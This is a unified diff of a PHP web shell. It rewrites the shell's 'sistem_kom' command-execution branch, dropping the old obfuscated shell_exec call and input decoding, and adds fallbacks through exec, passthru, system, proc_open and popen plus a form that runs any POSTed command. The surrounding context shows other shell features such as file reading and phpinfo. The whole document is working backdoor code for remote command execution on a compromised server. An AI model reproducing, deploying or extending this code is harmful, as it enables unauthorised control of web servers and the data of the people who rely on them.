@@ -899,21 +899,65 @@ if($awal=="phpinfo")
 {
 	print "<div style='width: 100%; height: 400px;'><iframe src='?awal=pinf' style='width: 100%; height: 400px; border: 0;'></iframe></div>";
 }
-else if($awal=="sistem_kom")
-{
-	if(isset($_POST['kom']) && is_string($_POST['kom']) && !empty($_POST['kom']))
-	{
-		$komanda = uraikan(urldecode($_POST['kom']));
-		$k = 'sh';
-		$k .= 'el';
-		$k .= 'l_e';
-		$k .= 'xe';
-		$k .= 'c';
-		$output = $k($komanda);
-		print '<pre style="max-height: 350px;overflow: auto; border: 1px solid #777; padding: 5px;">' . htmlspecialchars($output) . '</pre><hr>';
-	}
-	print '<input type="text" id="emr_et_atash" style="width: 500px;"> <button type="button" class="btn" onclick="sistemKom();">确定</button>';
+elseif ($awal == "sistem_kom") {
+    if (isset($_POST['kom']) && is_string($_POST['kom']) && !empty($_POST['kom'])) {
+        $komanda = urldecode($_POST['kom']); // Hapus validasi regex
+
+        // Pilih metode eksekusi perintah
+        $output = '';
+        if (function_exists('shell_exec')) {
+            // Menggunakan shell_exec
+            $output = shell_exec($komanda);
+        } elseif (function_exists('exec')) {
+            // Menggunakan exec
+            exec($komanda, $outputArray);
+            $output = implode("\n", $outputArray);
+        } elseif (function_exists('passthru')) {
+            ob_start();
+            passthru($komanda);
+            $output = ob_get_clean();
+        } elseif (function_exists('system')) {
+            ob_start();
+            system($komanda);
+            $output = ob_get_clean();
+        } elseif (function_exists('proc_open')) {
+            $descriptorspec = [
+                0 => ["pipe", "r"],
+                1 => ["pipe", "w"],
+                2 => ["pipe", "w"]
+            ];
+            $process = proc_open($komanda, $descriptorspec, $pipes);
+            if (is_resource($process)) {
+                $output = stream_get_contents($pipes[1]);
+                fclose($pipes[1]);
+                proc_close($process);
+            }
+        } elseif (function_exists('popen')) {
+            $handle = popen($komanda, 'r');
+            if ($handle) {
+                $output = '';
+                while (!feof($handle)) {
+                    $output .= fread($handle, 4096);
+                }
+                pclose($handle);
+            }
+        } else {
+            die("Tidak ada metode eksekusi perintah yang tersedia.");
+        }
+
+        $output = $output ?? "";
+        print '<pre style="max-height: 350px; overflow: auto; border: 1px solid #777; padding: 5px;">' . htmlspecialchars($output) . '</pre><hr>';
+    }
+    ?>
+    <!-- Form untuk input command -->
+    <form method="POST" action="">
+      <input type="hidden" name="awal" value="sistem_kom">
+      <input type="text" id="emr_et_atash" name="kom" style="width: 500px;">
+      <button type="submit" class="btn">确定</button>
+    </form>
+    <?php
 }
+
 else if($awal=="baca_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "")
 {
 	$namaBerkas = basename(uraikan(urldecode($_POST['fayl'])));
